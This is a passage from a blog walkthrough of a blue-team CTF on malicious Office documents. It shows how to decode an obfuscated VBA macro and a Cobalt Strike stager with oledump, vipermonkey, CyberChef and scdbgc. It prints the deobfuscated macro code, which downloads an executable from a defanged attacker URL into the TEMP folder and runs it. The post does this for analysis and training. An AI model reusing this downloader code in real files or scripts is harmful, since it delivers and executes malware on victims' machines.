    <span class="n">gGHBkj</span> <span class="o">=</span> <span class="n">XORI</span><span class="p">(</span><span class="n">Hextostring</span><span class="p">(</span><span class="s">"1C3B2404757F5B2826593D3F00277E102A7F1E3C7F16263E5A2A2811"</span><span class="p">),</span> <span class="n">Hextostring</span><span class="p">(</span><span class="s">"744F50"</span><span class="p">))</span>
    <span class="n">ZUWSBYDOTWV</span> <span class="n">gGHBkj</span><span class="p">,</span> <span class="n">Environ</span><span class="p">(</span><span class="n">XORI</span><span class="p">(</span><span class="n">Hextostring</span><span class="p">(</span><span class="s">"3E200501"</span><span class="p">),</span> <span class="n">Hextostring</span><span class="p">(</span><span class="s">"6A654851714A64"</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="n">XORI</span><span class="p">(</span><span class="n">Hextostring</span><span class="p">(</span><span class="s">"11371B0A00123918220E001668143516"</span><span class="p">),</span> <span class="n">Hextostring</span><span class="p">(</span><span class="s">"4D734243414671"</span><span class="p">))</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After decoding the strings using the <code class="language-plaintext highlighter-rouge">Hextostring</code> and <code class="language-plaintext highlighter-rouge">XORI</code> functions, the code simplifies to:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">Sub</span> <span class="nf">IOWZJGNTSGK</span><span class="p">()</span>
    <span class="n">domain</span> <span class="o">=</span> <span class="s">"hxxp://gv-roth.de/js/bin.exe"</span>
    <span class="n">ZUWSBYDOTWV</span> <span class="n">domain</span><span class="p">,</span> <span class="n">Environ</span><span class="p">(</span><span class="s">"TEMP"</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">"\DYIATHUQLCW.exe"</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Explanation:</strong></p>
<ul>
  <li>The macro passes an attacker-controlled domain (<code class="language-plaintext highlighter-rouge">hxxp://gv-roth.de/js/bin.exe</code>) and a file location (<code class="language-plaintext highlighter-rouge">%USER%\AppData\Local\Temp\DYIATHUQLCW.exe</code>) to the <code class="language-plaintext highlighter-rouge">ZUWSBYDOTWV</code> function.</li>
  <li><code class="language-plaintext highlighter-rouge">Environ("TEMP")</code> resolves to <code class="language-plaintext highlighter-rouge">%USER%\AppData\Local\Temp</code> in Windows 10.</li>
</ul>

<hr />

<h4 id="decoding-strings"><span class="me-2"><strong>Decoding Strings</strong></span><a href="#decoding-strings" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The <code class="language-plaintext highlighter-rouge">Hextostring</code> and <code class="language-plaintext highlighter-rouge">XORI</code> functions are rewritten in Python for easier decoding:</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">hextostring</span><span class="p">(</span><span class="n">hx</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
    <span class="n">hex_chars</span> <span class="o">=</span> <span class="p">[</span><span class="n">hx</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">hx</span><span class="p">),</span> <span class="mi">2</span><span class="p">)]</span>
    <span class="k">return</span> <span class="sa">b</span><span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">hc</span><span class="p">,</span> <span class="mi">16</span><span class="p">)).</span><span class="nf">encode</span><span class="p">()</span> <span class="k">for</span> <span class="n">hc</span> <span class="ow">in</span> <span class="n">hex_chars</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">cipher</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">return</span> <span class="sh">''</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">^</span> <span class="nf">int</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">cipher</span><span class="p">)])</span>

<span class="n">cipher</span> <span class="o">=</span> <span class="sh">""</span>  <span class="c1"># Add ciphertext
</span><span class="n">key</span> <span class="o">=</span> <span class="sh">""</span>  <span class="c1"># Add key
</span>
<span class="nf">print</span><span class="p">(</span><span class="nf">xor</span><span class="p">(</span><span class="nf">hextostring</span><span class="p">(</span><span class="n">cipher</span><span class="p">),</span> <span class="nf">hextostring</span><span class="p">(</span><span class="n">key</span><span class="p">)))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Using this approach, the <code class="language-plaintext highlighter-rouge">ZUWSBYDOTWV</code> function is cleaned up further:</p>

<div class="language-vb highlighter-rouge"><div class="code-header">
        <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="k">Function</span> <span class="nf">ZUWSBYDOTWV</span><span class="p">(</span><span class="k">ByVal</span> <span class="n">domain</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">,</span> <span class="k">ByVal</span> <span class="n">executableFileLocation</span> <span class="ow">As</span> <span class="kt">String</span><span class="p">)</span> <span class="ow">As</span> <span class="kt">Boolean</span>
    <span class="k">Dim</span> <span class="nv">xmlHttpClient</span> <span class="ow">As</span> <span class="kt">Object</span><span class="p">,</span> <span class="n">fileHandle</span> <span class="ow">As</span> <span class="kt">Long</span><span class="p">,</span> <span class="n">responseBody</span><span class="p">()</span> <span class="ow">As</span> <span class="kt">Byte</span>

    <span class="k">Set</span> <span class="n">xmlHttpClient</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"MSXML2.XMLHTTP"</span><span class="p">)</span>

    <span class="n">xmlHttpClient</span><span class="p">.</span><span class="n">Open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="n">domain</span><span class="p">,</span> <span class="k">False</span>
    <span class="n">xmlHttpClient</span><span class="p">.</span><span class="n">Send</span> <span class="s">"gVHBnk"</span>

    <span class="n">responseBody</span> <span class="o">=</span> <span class="n">xmlHttpClient</span><span class="p">.</span><span class="n">responseBody</span>

    <span class="n">fileHandle</span> <span class="o">=</span> <span class="n">FreeFile</span>
    <span class="n">Open</span> <span class="n">executableFileLocation</span> <span class="k">For</span> <span class="n">Binary</span> <span class="ow">As</span> <span class="p">#</span><span class="n">fileHandle</span>
    <span class="n">Put</span> <span class="p">#</span><span class="n">fileHandle</span><span class="p">,</span> <span class="p">,</span> <span class="n">responseBody</span>
    <span class="n">Close</span> <span class="p">#</span><span class="n">fileHandle</span>

    <span class="k">Set</span> <span class="n">hBBkbmop6VHJL</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Shell.Application"</span><span class="p">)</span>
    <span class="n">hBBkbmop6VHJL</span><span class="p">.</span><span class="n">Open</span> <span class="n">Environ</span><span class="p">(</span><span class="s">"TEMP"</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s">"\DYIATHUQLCW.exe"</span>
<span class="k">End</span> <span class="k">Function</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Step-by-Step Breakdown:</strong></p>
<ol>
  <li>
    <p><strong>HTTP Request:</strong><br />
The macro initializes an <code class="language-plaintext highlighter-rouge">XmlHttp</code> client to send a GET request to the attacker-controlled domain (<code class="language-plaintext highlighter-rouge">hxxp://gv-roth.de/js/bin.exe</code>).</p>
  </li>
  <li>
    <p><strong>Saving the Response:</strong><br />
The response body is written to a file at <code class="language-plaintext highlighter-rouge">%USER%\AppData\Local\Temp\DYIATHUQLCW.exe</code>.</p>
  </li>
  <li>
    <p><strong>Executing the File:</strong><br />
The downloaded executable is executed using <code class="language-plaintext highlighter-rouge">Shell.Application.Open</code>.</p>
  </li>
</ol>

<hr />

<h4 id="observations-1"><span class="me-2"><strong>Observations</strong></span><a href="#observations-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<ul>
  <li><strong>Q1:</strong> What is the malicious C2 domain you found in the maldoc? <code class="language-plaintext highlighter-rouge">hxxp://gv-roth.de/js/bin.exe</code>.</li>
  <li><strong>Q2:</strong> What executable file is the maldoc trying to drop? <code class="language-plaintext highlighter-rouge">DYIATHUQLCW.exe</code>.</li>
  <li><strong>Q3:</strong> In what folder is it dropping the malicious executable? <code class="language-plaintext highlighter-rouge">%USER%\AppData\Local\Temp</code>.</li>
  <li><strong>Q4:</strong> Provide the name of the COM object the maldoc is trying to access. <code class="language-plaintext highlighter-rouge">Shell.Application</code>.</li>
</ul>

<hr />

<h3 id="attacker-5"><span class="me-2"><strong>Attacker 5</strong></span><a href="#attacker-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="question-1-what-is-the-caption-you-found-in-the-maldoc"><span class="me-2"><strong>Question 1: What is the caption you found in the maldoc?</strong></span><a href="#question-1-what-is-the-caption-you-found-in-the-maldoc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>We begin by identifying streams containing macros using <code class="language-plaintext highlighter-rouge">oledump.py</code>. To extract all strings from the document, we use the following command:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py attacker5.doc <span class="nt">-s</span> a <span class="nt">-S</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This outputs numerous strings. To narrow down the search, we filter for the term “caption” using <code class="language-plaintext highlighter-rouge">grep</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>oledump.py attacker5.doc <span class="nt">-s</span> a <span class="nt">-S</span> | <span class="nb">grep</span> <span class="nt">-i</span> caption
</pre></td></tr></tbody></table></code></div></div>

<p>The filtered output will reveal the caption string.</p>

<hr />

<h4 id="question-2-what-is-the-xor-decimal-value-found-in-the-decoded-base64-script"><span class="me-2"><strong>Question 2: What is the XOR decimal value found in the decoded-base64 script?</strong></span><a href="#question-2-what-is-the-xor-decimal-value-found-in-the-decoded-base64-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>To locate the base64-encoded script, we emulate the VBA macros using <code class="language-plaintext highlighter-rouge">vipermonkey</code>:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>vmonkey attacker5.doc
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">vipermonkey</code> identifies a base64-encoded string. We decode this string using <strong>CyberChef</strong>:</p>
<ol>
  <li>Add the <strong>Decode Base64</strong> action.</li>
  <li>Add the <strong>Remove Null Bytes</strong> action.</li>
</ol>

<p>If the output still contains obfuscated content, look for additional base64 encoding or compression. For example:</p>
<ul>
  <li>If the script contains a call to <code class="language-plaintext highlighter-rouge">FromBase64String</code>, copy the encoded string and decode it again in CyberChef.</li>
  <li>If the script mentions <code class="language-plaintext highlighter-rouge">New-Object IO.Compression.GzipStream</code>, add the <strong>Gunzip</strong> action to decompress the data.</li>
</ul>

<p>Once fully decoded, search the output for the term “xor” to find the XOR decimal value.</p>

<hr />

<h4 id="question-3-provide-the-c2-ip-address-of-the-cobalt-strike-server"><span class="me-2"><strong>Question 3: Provide the C2 IP address of the Cobalt Strike server</strong></span><a href="#question-3-provide-the-c2-ip-address-of-the-cobalt-strike-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>After decoding the script in CyberChef, observe any remaining base64-encoded text. Copy this text into a new CyberChef window and:</p>
<ol>
  <li>Decode the base64 string.</li>
  <li>Apply an XOR operation using the decimal value identified in Question 2.</li>
</ol>

<p>The resulting output will contain legible information, including the C2 IP address.</p>

<hr />

<h4 id="question-4-provide-the-full-user-agent-found"><span class="me-2"><strong>Question 4: Provide the full user-agent found</strong></span><a href="#question-4-provide-the-full-user-agent-found" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The user-agent string will be visible in the output obtained during the previous step. Simply copy the user-agent string from the decoded script.</p>

<hr />

<h4 id="question-5-provide-the-path-value-for-the-cobalt-strike-shellcode"><span class="me-2"><strong>Question 5: Provide the path value for the Cobalt Strike shellcode</strong></span><a href="#question-5-provide-the-path-value-for-the-cobalt-strike-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Save the decoded shellcode from CyberChef to a file (e.g., <code class="language-plaintext highlighter-rouge">download.dat</code>). Use <code class="language-plaintext highlighter-rouge">scdbgc</code> to analyze the shellcode:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>parrot@parrot:~<span class="nv">$ </span>scdbgc <span class="nt">-f</span> ~/Downloads/download.dat <span class="nt">-s</span> <span class="nt">-1</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The output will include details about the shellcode’s behavior, including paths. Identify the relevant path values from the output.</p>

<hr />

<h4 id="question-6-provide-the-port-number-of-the-cobalt-strike-c2-server"><span class="me-2"><strong>Question 6: Provide the port number of the Cobalt Strike C2 Server</strong></span><a href="#question-6-provide-the-port-number-of-the-cobalt-strike-c2-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>In the output generated by <code class="language-plaintext highlighter-rouge">scdbgc</code>, look for the port number associated with the C2 server’s IP address.</p>

<hr />

<h4 id="question-7-provide-the-first-two-apis-found"><span class="me-2"><strong>Question 7: Provide the first two APIs found</strong></span><a href="#question-7-provide-the-first-two-apis-found" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Examine the <code class="language-plaintext highlighter-rouge">scdbgc</code> output for the first two API calls made by the shellcode. These will typically appear near the beginning of the execution trace.</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>,
          <a href="/categories/blue-team/">Blue Team</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
          <a
            href="/tags/blue-team/"
            class="post-tag no-text-decoration"
          >Blue Team</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://github.com/Diogo-Lages" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Github" aria-label="Github">
        <i class="fa-fw fab fa-github"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/in/diogo-lages/" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/web-cybersecurity-frameworks">Web: Cybersecurity Frameworks</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/ctf-redteam-lookup">THM: Lookup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/python-digital-forensics-toolkit">Digital Forensics Toolkit</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/bug-bounty/ssrf">Server-Side Request Forgery (SSRF)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/python-network-scanner">Network Scanner</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blue-team/">Blue Team</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bug-bounty/">Bug Bounty</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/vulnerabilities/">Vulnerabilities</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/2fa-bypass/">2FA Bypass</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/advanced-search/">Advanced Search</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/anonymity/">Anonymity</a>
      
    </div>
  </section>

            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/ctf-blueteam-masterminds" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736035200"
  data-df="ll"
  
>
  Jan  5, 2025
</time>

              <h4 class="pt-0 my-2">THM: Masterminds</h4>
              <div class="text-muted">
                <p>Walkthrough

CTF Platform: TryHackMe
Level: Medium

Tools Used:

  Brim
  Zeek (formerly Bro)
  Suricata
  VirusTotal
  URLhaus Database


Resources Used:

  Masterminds: TryHackMe


Steps for the ...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ctf-blueteam-all-boogeyman" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1735948800"
  data-df="ll"
  
>
  Jan  4, 2025
</time>

              <h4 class="pt-0 my-2">THM: Boogeyman (All)</h4>
              <div class="text-muted">
                <p>Walkthrough

CTF Platform: TryHackMe
Level: Medium

Tools Used:


  Impacket: For SMB server setup and file transfer.
  Wireshark/Tshark: For network traffic analysis.
  jq: For parsing JSON logs.
...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/ctf-blueteam-carnage" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1735862400"
  data-df="ll"
  
>
  Jan  3, 2025
</time>

              <h4 class="pt-0 my-2">THM: Carnage</h4>
              <div class="text-muted">
                <p>Walkthrough

CTF Platform: TryHackMe
Level: Medium

Tools Used:


  Wireshark


Resources Used::


  Carnage: TryHackMe
  VirusTotal
  Wireshark Documentation


Steps for the CTF



1. What was the...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/ctf-blueteam-carnage"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>THM: Carnage</p>
    </a>
  

  
    <a
      href="/posts/ctf-blueteam-all-boogeyman"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>THM: Boogeyman (All)</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://twitter.com/diogo-lages">Diogo Lages</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
